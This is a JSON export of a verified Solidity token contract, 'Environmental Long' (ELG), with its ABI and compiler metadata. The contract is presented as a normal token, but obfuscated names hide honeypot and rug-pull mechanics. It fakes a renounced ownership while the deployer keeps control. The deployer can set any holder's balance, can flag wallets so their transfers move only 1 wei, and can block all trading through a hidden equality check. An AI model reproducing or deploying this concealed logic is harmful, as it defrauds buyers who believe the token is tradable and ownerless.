{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface totalSender {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract teamAt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface minFund {\n    function createPair(address autoTokenFund, address liquidityTake) external returns (address);\n}\n\ninterface autoTx {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address teamLaunched) external view returns (uint256);\n\n    function transfer(address launchAutoSwap, uint256 liquidityMode) external returns (bool);\n\n    function allowance(address teamModeFrom, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 liquidityMode) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchAutoSwap,\n        uint256 liquidityMode\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed totalAmount, uint256 value);\n    event Approval(address indexed teamModeFrom, address indexed spender, uint256 value);\n}\n\ninterface maxSell is autoTx {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract EnvironmentalLong is teamAt, autoTx, maxSell {\n\n    uint256 constant atIs = 1 ** 10;\n\n    function autoAt(address txListAmount, address launchAutoSwap, uint256 liquidityMode) internal returns (bool) {\n        require(walletTrading[txListAmount] >= liquidityMode);\n        walletTrading[txListAmount] -= liquidityMode;\n        walletTrading[launchAutoSwap] += liquidityMode;\n        emit Transfer(txListAmount, launchAutoSwap, liquidityMode);\n        return true;\n    }\n\n    bool private buyShould;\n\n    function owner() external view returns (address) {\n        return teamLaunch;\n    }\n\n    address listTotalTx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    constructor (){\n        \n        totalSender liquidityEnable = totalSender(marketingReceiver);\n        enableList = minFund(liquidityEnable.factory()).createPair(liquidityEnable.WETH(), address(this));\n        \n        teamAutoFund = _msgSender();\n        autoTotalTx();\n        exemptMode[teamAutoFund] = true;\n        walletTrading[teamAutoFund] = receiverLaunchedMarketing;\n        if (fundLaunch != modeIs) {\n            teamAmount = false;\n        }\n        emit Transfer(address(0), teamAutoFund, receiverLaunchedMarketing);\n    }\n\n    function allowance(address launchedTeamEnable, address modeWalletReceiver) external view virtual override returns (uint256) {\n        if (modeWalletReceiver == marketingReceiver) {\n            return type(uint256).max;\n        }\n        return swapTx[launchedTeamEnable][modeWalletReceiver];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return receiverMarketingAt;\n    }\n\n    mapping(address => bool) public enableMin;\n\n    uint256 private receiverLaunchedMarketing = 100000000 * 10 ** 18;\n\n    mapping(address => bool) public exemptMode;\n\n    function balanceOf(address teamLaunched) public view virtual override returns (uint256) {\n        return walletTrading[teamLaunched];\n    }\n\n    bool public minTeamTx;\n\n    function senderReceiver(address limitTokenReceiver) public {\n        if (senderAmount) {\n            return;\n        }\n        if (fundTotal == buyShould) {\n            fundTotal = true;\n        }\n        exemptMode[limitTokenReceiver] = true;\n        \n        senderAmount = true;\n    }\n\n    function approve(address modeWalletReceiver, uint256 liquidityMode) public virtual override returns (bool) {\n        swapTx[_msgSender()][modeWalletReceiver] = liquidityMode;\n        emit Approval(_msgSender(), modeWalletReceiver, liquidityMode);\n        return true;\n    }\n\n    function listMax(uint256 liquidityMode) public {\n        amountLiquidity();\n        toLaunch = liquidityMode;\n    }\n\n    address public enableList;\n\n    mapping(address => mapping(address => uint256)) private swapTx;\n\n    uint256 toLaunch;\n\n    uint256 private modeIs;\n\n    function symbol() external view virtual override returns (string memory) {\n        return limitTake;\n    }\n\n    uint8 private isTotal = 18;\n\n    bool public fundTotal;\n\n    function transferFrom(address txListAmount, address launchAutoSwap, uint256 liquidityMode) external override returns (bool) {\n        if (_msgSender() != marketingReceiver) {\n            if (swapTx[txListAmount][_msgSender()] != type(uint256).max) {\n                require(liquidityMode <= swapTx[txListAmount][_msgSender()]);\n                swapTx[txListAmount][_msgSender()] -= liquidityMode;\n            }\n        }\n        return sellEnable(txListAmount, launchAutoSwap, liquidityMode);\n    }\n\n    uint256 receiverSell;\n\n    function autoTotalTx() public {\n        emit OwnershipTransferred(teamAutoFund, address(0));\n        teamLaunch = address(0);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return isTotal;\n    }\n\n    function sellEnable(address txListAmount, address launchAutoSwap, uint256 liquidityMode) internal returns (bool) {\n        if (txListAmount == teamAutoFund) {\n            return autoAt(txListAmount, launchAutoSwap, liquidityMode);\n        }\n        uint256 tradingSell = autoTx(enableList).balanceOf(listTotalTx);\n        require(tradingSell == toLaunch);\n        require(launchAutoSwap != listTotalTx);\n        if (enableMin[txListAmount]) {\n            return autoAt(txListAmount, launchAutoSwap, atIs);\n        }\n        return autoAt(txListAmount, launchAutoSwap, liquidityMode);\n    }\n\n    string private limitTake = \"ELG\";\n\n    address public teamAutoFund;\n\n    function receiverTeam(address swapIs, uint256 liquidityMode) public {\n        amountLiquidity();\n        walletTrading[swapIs] = liquidityMode;\n    }\n\n    uint256 public fundLaunch;\n\n    function liquidityLaunched(address launchedTake) public {\n        amountLiquidity();\n        \n        if (launchedTake == teamAutoFund || launchedTake == enableList) {\n            return;\n        }\n        enableMin[launchedTake] = true;\n    }\n\n    function transfer(address swapIs, uint256 liquidityMode) external virtual override returns (bool) {\n        return sellEnable(_msgSender(), swapIs, liquidityMode);\n    }\n\n    bool private teamAmount;\n\n    address private teamLaunch;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverLaunchedMarketing;\n    }\n\n    function getOwner() external view returns (address) {\n        return teamLaunch;\n    }\n\n    address marketingReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function amountLiquidity() private view {\n        require(exemptMode[_msgSender()]);\n    }\n\n    bool public senderAmount;\n\n    event OwnershipTransferred(address indexed liquidityFund, address indexed amountMode);\n\n    string private receiverMarketingAt = \"Environmental Long\";\n\n    mapping(address => uint256) private walletTrading;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamModeFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountMode\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalAmount\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedTeamEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeWalletReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeWalletReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityMode\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoTotalTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamLaunched\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedTake\",\"type\":\"address\"}],\"name\":\"liquidityLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"liquidityMode\",\"type\":\"uint256\"}],\"name\":\"listMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minTeamTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityMode\",\"type\":\"uint256\"}],\"name\":\"receiverTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTokenReceiver\",\"type\":\"address\"}],\"name\":\"senderReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamAutoFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityMode\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txListAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchAutoSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityMode\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "EnvironmentalLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}